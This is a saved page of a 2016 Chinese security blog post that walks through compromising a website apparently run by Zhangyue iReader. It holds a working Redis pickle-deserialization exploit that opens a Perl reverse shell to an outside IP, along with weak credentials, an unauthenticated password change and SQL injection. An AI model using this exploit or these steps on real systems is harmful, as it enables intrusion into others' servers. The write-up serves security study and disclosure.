@@ -1,0 +1,397 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./掌阅iReader某站Python漏洞挖掘  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./掌阅iReader某站Python漏洞挖掘  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./掌阅iReader某站Python漏洞挖掘  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>掌阅iReader某站Python漏洞挖掘 | 离别歌</title>
+<link href="./掌阅iReader某站Python漏洞挖掘  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./掌阅iReader某站Python漏洞挖掘  离别歌/styles.css" rel="stylesheet"/>
+<link href="./掌阅iReader某站Python漏洞挖掘  离别歌/style.css" rel="stylesheet"/>
+<link href="./掌阅iReader某站Python漏洞挖掘  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./掌阅iReader某站Python漏洞挖掘  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./掌阅iReader某站Python漏洞挖掘  离别歌/jquery.min.js"></script>
+<link href="./掌阅iReader某站Python漏洞挖掘  离别歌/code.css" rel="stylesheet"/>
+<link href="./掌阅iReader某站Python漏洞挖掘  离别歌/button.css" rel="stylesheet"/>
+<link href="./掌阅iReader某站Python漏洞挖掘  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./掌阅iReader某站Python漏洞挖掘  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html&amp;text=%E6%8E%8C%E9%98%85iReader%E6%9F%90%E7%AB%99Python%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html&amp;title=%E6%8E%8C%E9%98%85iReader%E6%9F%90%E7%AB%99Python%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html&amp;is_video=false&amp;description=%E6%8E%8C%E9%98%85iReader%E6%9F%90%E7%AB%99Python%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=%E6%8E%8C%E9%98%85iReader%E6%9F%90%E7%AB%99Python%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html&amp;title=%E6%8E%8C%E9%98%85iReader%E6%9F%90%E7%AB%99Python%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html&amp;title=%E6%8E%8C%E9%98%85iReader%E6%9F%90%E7%AB%99Python%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html&amp;title=%E6%8E%8C%E9%98%85iReader%E6%9F%90%E7%AB%99Python%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html&amp;title=%E6%8E%8C%E9%98%85iReader%E6%9F%90%E7%AB%99Python%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html&amp;name=%E6%8E%8C%E9%98%85iReader%E6%9F%90%E7%AB%99Python%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">掌阅iReader某站Python漏洞挖掘</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2016年7月14日 15:04" itemprop="datePublished">
+                    2016 七月 14 15:04
+                </time>
+</div>
+<div class="article-tag">
+            阅读：4629
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/python%E5%AE%89%E5%85%A8">python安全</a>,
+                
+                <a class="tag-link" href="/tag/redis">redis</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>Python作为新一代的web开发语言，不少互联网公司内外网使用其开发站点。Python web周边还存在redis、memcached、mongod、supervisord等等服务，我们结合这些服务的一系列安全问题，将可以做很多有趣的事情。</p>
+<p>目标端口开放了 6379、8080~8086、8889、8079</p>
+<p>首先，8080~8086、8889都是web服务，而且是一个站，6379是redis、8079是一个web服务但有http基础认证。</p>
+<p>逐一击破。</p>
+<ul>
+<li>8080~8086、8889：存在弱口令admin - admin1234</li>
+<li>6379：存在redis未授权访问</li>
+<li>8079：存在弱口令user - 123，登录查看发现是Supervisord管理页面</li>
+</ul>
+<p>从易到难，先看redis，也许可以直接通过redis拿下root。</p>
+<p>redis已经被人扫过，写过公钥：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/1d351468480845.jpg"><img alt="14655868157516.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-1d351468480845.jpg" title="点击查看原图"/></a></p>
+<p>写入/root/.ssh/和/root/目录提示如下：</p>
+<div class="codehilite"><pre><span></span>(error) ERR Changing directory: Permission denied
+</pre></div>
+<p>可能是redis被降权了。再试一下写crontab。</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/c2d11468480638.jpg"><img alt="14655680201594.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-c2d11468480638.jpg" title="点击查看原图"/></a></p>
+<p>可能真是被降权了。</p>
+<p>我们看看redis里面放了些什么：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/5e111468480718.jpg"><img alt="14655682285302.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-5e111468480718.jpg" title="点击查看原图"/></a></p>
+<p>看这个<code>(dp1\nS'user'\np2\nI7\ns.</code>，长的就像python里的Pickle。而Pickle是可以执行python代码的。</p>
+<p>所以，屡一下思路：</p>
+<ol>
+<li>网站是python开发的</li>
+<li>redis可写文件，但权限有限</li>
+<li>redis中存着序列化字符串，可能是被用作session</li>
+<li>python反序列化过程中可以执行代码</li>
+</ol>
+<p>所以，我想到如下两个思路：</p>
+<ol>
+<li>利用redis写一个python的webshell</li>
+<li>利用反序列化直接执行python代码</li>
+</ol>
+<p>明显，第一种方法需要 1.知道web路径 2.redis有权限写web目录 3.可能要重启web服务（但因为我们有Supervisord管理权限，所以重启服务也不难）</p>
+<p>第二种方法较为实际。所以，我写一个python pickle反序列化利用的脚本：</p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#</span>
+<span class="kn">import</span> <span class="nn">cPickle</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">redis</span>
+
+<span class="k">class</span> <span class="nc">exp</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="s2">"""perl -e 'use Socket;$i="159.203.220.19";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'"""</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="n">s</span><span class="p">,))</span>
+
+<span class="n">e</span> <span class="o">=</span> <span class="n">exp</span><span class="p">()</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'xxx.xxx.xxx.xxx'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span> <span class="n">db</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s2">"e6c36e69a9cf9543243d7921aa1a3d8093b49441"</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
+</pre></div>
+<p>执行这个脚本，就可以向<em>.</em>.<em>.</em>:6379的redis中写一个key为e6c36e69a9cf9543243d7921aa1a3d8093b49441，值为序列化字符串的session。</p>
+<p>然后我们来到http://<em>.</em>.<em>.</em>:8080，将cookie设置为session_id=e6c36e69a9cf9543243d7921aa1a3d8093b49441;刷新页面，那边的shell就弹好了：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/d0e01468480700.jpg"><img alt="14655818336051.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-d0e01468480700.jpg" title="点击查看原图"/></a></p>
+<p>分析一下它的nginx，可以发现他是将python程序开在8081~8086的端口上，并用nginx监听8889端口反向代理做负载均衡（感觉有点画蛇添足）：</p>
+<div class="codehilite"><pre><span></span><span class="nt">upstream</span> <span class="nt">tornado_cmread</span><span class="p">{</span>
+    <span class="err">server</span>    <span class="err">127.0.0.1:8086</span>   <span class="err">max_fails=2</span> <span class="err">fail_timeout=30s</span> <span class="err">weight=1</span><span class="p">;</span>
+    <span class="err">server</span>    <span class="err">127.0.0.1:8081</span>   <span class="err">max_fails=2</span> <span class="err">fail_timeout=30s</span> <span class="err">weight=1</span><span class="p">;</span>
+    <span class="err">server</span>    <span class="err">127.0.0.1:8082</span>   <span class="err">max_fails=2</span> <span class="err">fail_timeout=30s</span> <span class="err">weight=1</span><span class="p">;</span>
+    <span class="err">server</span>    <span class="err">127.0.0.1:8083</span>   <span class="err">max_fails=2</span> <span class="err">fail_timeout=30s</span> <span class="err">weight=1</span><span class="p">;</span>
+    <span class="err">server</span>    <span class="err">127.0.0.1:8084</span>   <span class="err">max_fails=2</span> <span class="err">fail_timeout=30s</span> <span class="err">weight=1</span><span class="p">;</span>
+    <span class="err">server</span>    <span class="err">127.0.0.1:8085</span>   <span class="err">max_fails=2</span> <span class="err">fail_timeout=30s</span> <span class="err">weight=1</span><span class="p">;</span>
+    <span class="err">keepalive</span> <span class="err">16</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>supervisord 存在弱口令</p>
+<div class="codehilite"><pre><span></span>[inet_http_server]         ; inet (TCP) server disabled by default
+port=*:8079        ; (ip_address:port specifier, *:port for all iface)
+username=user              ; (default is no username (open server))
+password=123               ; (default is no password (open server)) &lt;/pre&gt;
+</pre></div>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/80a61468481594.jpg"><img alt="14655853333928.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-80a61468481594.jpg" title="点击查看原图"/></a></p>
+<p>基本可以确定这个站和掌阅有关系：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/878b1468481801.jpg"><img alt="14655863437770.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-878b1468481801.jpg" title="点击查看原图"/></a></p>
+<p>邮箱一枚：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/0aef1468480856.jpg"><img alt="14655866587304.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-0aef1468480856.jpg" title="点击查看原图"/></a></p>
+<p>git log可查看提交日志：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/e5a61468480930.jpg"><img alt="14656513040677.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-e5a61468480930.jpg" title="点击查看原图"/></a></p>
+<p>然后简单看看代码，就发现一处未授权修改管理密码：</p>
+<div class="codehilite"><pre><span></span><span class="k">class</span> <span class="nc">LoginHandler</span><span class="p">(</span><span class="n">BaseHandler</span><span class="p">):</span>
+    <span class="sd">"""</span>
+<span class="sd">        用户登陆退出修改密码模块</span>
+<span class="sd">    """</span>
+
+    <span class="n">NEED_LOGIN</span> <span class="o">=</span> <span class="bp">False</span>
+
+    <span class="o">....</span>
+
+    <span class="k">def</span> <span class="nf">update_password</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="sd">"""</span>
+<span class="sd">        修改密码</span>
+<span class="sd">        :return:</span>
+<span class="sd">        """</span>
+        <span class="n">user_id</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s2">"user_id"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+        <span class="n">password</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s2">"password"</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span>
+        <span class="n">service</span> <span class="o">=</span> <span class="n">Service</span><span class="o">.</span><span class="n">inst</span><span class="p">()</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">service</span><span class="o">.</span><span class="n">inst</span><span class="p">()</span><span class="o">.</span><span class="n">user</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">api_json</span><span class="p">({</span><span class="s2">"code"</span><span class="p">:</span> <span class="n">Status</span><span class="o">.</span><span class="n">SUCCESS</span><span class="p">,</span> <span class="s2">"msg"</span><span class="p">:</span> <span class="s2">"修改成功"</span><span class="p">})</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="n">logging</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">"修改密码失败=</span><span class="si">%s</span><span class="s2">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="n">exc_info</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">api_json</span><span class="p">({</span><span class="s2">"code"</span><span class="p">:</span> <span class="n">Status</span><span class="o">.</span><span class="n">ERROR</span><span class="p">,</span> <span class="s2">"msg"</span><span class="p">:</span> <span class="s2">"修改失败"</span><span class="p">})</span>
+</pre></div>
+<p>NEED_LOGIN = False，这个类是无需登录就可以访问的类，而修改密码的方法update_password却在这个类里……</p>
+<p>只需要传入user_id=xx&amp;password=123456，即可将user_id为xx的用户密码改为123456，试一下(admin的id=7)：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/49971468480864.jpg"><img alt="14656573182409.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-49971468480864.jpg" title="点击查看原图"/></a></p>
+<p>登录（admin-123456）OK：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/d88e1468481012.jpg"><img alt="14656576116135.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-d88e1468481012.jpg" title="点击查看原图"/></a></p>
+<p>另外，handler/api.py这也是无需登录的类，其中存在多个注入，如：</p>
+<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_chapter_list</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    <span class="sd">"""</span>
+<span class="sd">    获取章节列表</span>
+<span class="sd">    :return:</span>
+<span class="sd">    """</span>
+    <span class="n">book_id</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s2">"book_id"</span><span class="p">)</span>
+    <span class="n">client_id</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s2">"client_id"</span><span class="p">)</span>
+    <span class="n">sign</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_argument</span><span class="p">(</span><span class="s2">"sign"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">book_id</span><span class="p">:</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">api_json</span><span class="p">({</span><span class="s2">"status"</span><span class="p">:</span> <span class="n">Status</span><span class="o">.</span><span class="n">ERROR</span><span class="p">,</span> <span class="s2">"msg"</span><span class="p">:</span> <span class="s2">"参数缺失"</span><span class="p">})</span>
+        <span class="k">return</span>
+    <span class="n">md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">client_id</span><span class="o">+</span><span class="n">SIGN_SECERT</span><span class="o">+</span><span class="n">book_id</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">md5</span> <span class="o">!=</span> <span class="n">sign</span><span class="p">:</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">api_json</span><span class="p">({</span><span class="s2">"status"</span><span class="p">:</span> <span class="n">Status</span><span class="o">.</span><span class="n">ERROR</span><span class="p">,</span> <span class="s2">"msg"</span><span class="p">:</span> <span class="s2">"非法请求"</span><span class="p">})</span>
+        <span class="k">return</span>
+    <span class="n">chapter_service</span> <span class="o">=</span> <span class="n">Service</span><span class="o">.</span><span class="n">inst</span><span class="p">()</span><span class="o">.</span><span class="n">chapter</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">chapter_list</span> <span class="o">=</span> <span class="n">chapter_service</span><span class="o">.</span><span class="n">get_upload_chapter_list</span><span class="p">(</span><span class="n">book_id</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">api_json</span><span class="p">(</span><span class="n">chapter_list</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="s2">"查询章节列表=</span><span class="si">%s</span><span class="s2">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">),</span> <span class="n">exc_info</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">api_json</span><span class="p">({</span><span class="s2">"status"</span><span class="p">:</span> <span class="n">Status</span><span class="o">.</span><span class="n">ERROR</span><span class="p">,</span> <span class="s2">"msg"</span><span class="p">:</span> <span class="s2">"查询失败"</span><span class="p">})</span> 
+</pre></div>
+<p>跟进get_upload_chapter_list：</p>
+<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_upload_chapter_list</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">book_id</span><span class="p">):</span>
+    <span class="sd">"""</span>
+<span class="sd">    获取同步给客户端的章节列表</span>
+<span class="sd">    :param book_id:</span>
+<span class="sd">    :return:</span>
+<span class="sd">    """</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="n">Query</span><span class="p">()</span>
+    <span class="n">query</span><span class="o">.</span><span class="n">set_table</span><span class="p">(</span><span class="s2">"book_zhang"</span><span class="p">)</span>
+    <span class="n">query</span><span class="o">.</span><span class="n">set_sql</span><span class="p">(</span><span class="s2">"select id, chaptername name"</span><span class="p">)</span>
+    <span class="n">query</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">" book_id = </span><span class="si">%s</span><span class="s2"> "</span> <span class="o">%</span> <span class="n">book_id</span><span class="p">)</span>
+    <span class="n">query</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="s2">"app_ifup = 1"</span><span class="p">)</span>
+    <span class="n">query</span><span class="o">.</span><span class="n">orderby</span><span class="p">(</span><span class="s2">"chapterid"</span><span class="p">,</span> <span class="s2">"asc"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">query</span><span class="o">.</span><span class="n">data</span><span class="p">()</span> 
+</pre></div>
+<p>可见book_id被拼接进where语句了。但前面还需要绕过：md5 = hashlib.md5(client_id+SIGN_SECERT+book_id).hexdigest()</p>
+<p>想必看过这篇文章的同学（ <a href="https://www.leavesongs.com/PENETRATION/phpwind-hash-length-extension-attack.html"><a href="https://www.leavesongs.com/PENETRATION/phpwind-hash-length-extension-attack.html">https://www.leavesongs.com/PENETRATION/phpwind-hash-length-extension-attack.html</a></a> ）都知道该怎么绕过吧，利用哈希长度扩展攻击。我就不演示绕过了，直接用我读到的key来进行注入：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/87a21468483983.jpg"><img alt="14656602992464.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-87a21468483983.jpg" title="点击查看原图"/></a></p>
+<p>另外，盲注也有一堆。比如这个盲注：</p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/68121468481032.jpg"><img alt="14656595412984.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-68121468481032.jpg" title="点击查看原图"/></a></p>
+<p><a href="https://www.leavesongs.com/content/uploadfile/201607/112f1468481079.jpg"><img alt="14656595688502.jpg" src="./掌阅iReader某站Python漏洞挖掘  离别歌/thum-112f1468481079.jpg" title="点击查看原图"/></a></p>
+<p>不多说了。。</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2394">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./掌阅iReader某站Python漏洞挖掘  离别歌/7fc2d5c0b745eb9df8e5cb662d8535c3.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://sh3ll.me" target="_blank">Chu</a>
+<time datetime="2016年7月26日 16:56" itemprop="datePublished">
+                            2016 七月 26 16:56
+                        </time>
+<a href="javascript:reply_to('2394', 'Chu')">回复</a>
+</p>
+<p class="comment-meta">这个厉害</p>
+</div>
+</div>
+<div class="row" id="comment-2385">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./掌阅iReader某站Python漏洞挖掘  离别歌/55678cddf7b13db8238d983b1cf955b4.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">广东硅谷学院</a>
+<time datetime="2016年7月24日 19:54" itemprop="datePublished">
+                            2016 七月 24 19:54
+                        </time>
+<a href="javascript:reply_to('2385', '广东硅谷学院')">回复</a>
+</p>
+<p class="comment-meta">#广东硅谷学院#学好IT好就业选硅谷IT，学技能拿文凭事半功倍，紧跟专业教师一起冲浪IT行业。我们有建设学习型专业师资团队，教师领跑学生紧随其后。(QQ：800015777，电话0754-88989555)</p>
+</div>
+</div>
+<div class="row" id="comment-2383">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./掌阅iReader某站Python漏洞挖掘  离别歌/7edb2f4a0823cf89ed72b0f0a154c121.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.melodia.pw" target="_blank">Melody</a>
+<time datetime="2016年7月19日 21:12" itemprop="datePublished">
+                            2016 七月 19 21:12
+                        </time>
+<a href="javascript:reply_to('2383', 'Melody')">回复</a>
+</p>
+<p class="comment-meta">哈希长度扩展攻击实战中一次没见过QAQ，p师傅一找一个准</p>
+</div>
+</div>
+<div class="row" id="comment-2382">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./掌阅iReader某站Python漏洞挖掘  离别歌/537ff4eba16e2e15c452a48128e3ee48.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">rainism</a>
+<time datetime="2016年7月18日 11:11" itemprop="datePublished">
+                            2016 七月 18 11:11
+                        </time>
+<a href="javascript:reply_to('2382', 'rainism')">回复</a>
+</p>
+<p class="comment-meta">学习了，很有意思</p>
+</div>
+</div>
+<div class="row" id="comment-2381">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./掌阅iReader某站Python漏洞挖掘  离别歌/47120843080065446dc965caf52debd1.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://rickgray.me" target="_blank">RickGray</a>
+<time datetime="2016年7月15日 00:22" itemprop="datePublished">
+                            2016 七月 15 00:22
+                        </time>
+<a href="javascript:reply_to('2381', 'RickGray')">回复</a>
+</p>
+<p class="comment-meta">中间件 python 序列化实例教学</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="10076b5762c155426a3a2e228b9f9e3850570f52"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./掌阅iReader某站Python漏洞挖掘  离别歌/10076b5762c155426a3a2e228b9f9e3850570f52"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="389">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="8LNugTIDUV8Bv2y38cTGKuXdXG4dqIEPG5804nUSlI20vHWiWtnqj8Zi6Kxl9ctZ"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./掌阅iReader某站Python漏洞挖掘  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
